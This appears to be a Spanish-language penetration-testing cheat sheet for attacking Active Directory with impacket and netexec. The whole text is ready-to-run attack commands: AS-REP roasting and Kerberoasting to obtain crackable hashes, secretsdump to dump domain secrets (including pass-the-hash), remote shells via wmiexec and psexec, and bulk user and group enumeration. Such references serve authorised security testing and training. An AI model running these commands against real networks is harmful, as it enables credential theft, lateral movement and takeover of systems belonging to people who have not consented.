# Active Directory (impacket + netexec)

## AS-REP roasting (usuarios sin preauth)
GetNPUsers.py DOMINIO/ -usersfile usuarios.txt -no-pass -dc-ip $T
# el hash $krb5asrep$ se crackea con john --wordlist=$(seclists -p)

## Kerberoasting (necesita credenciales)
GetUserSPNs.py DOMINIO/usuario:'Password123' -dc-ip $T -request

## Volcar secretos / hashes
secretsdump.py DOMINIO/usuario:'Password123'@$T
secretsdump.py -hashes :<nt_hash> administrador@$T

## Shell remota
wmiexec.py DOMINIO/usuario:'Password123'@$T
psexec.py  DOMINIO/usuario:'Password123'@$T

## Enumeración masiva
netexec smb $T -u usuario -p 'Password123' --users --groups --pass-pol
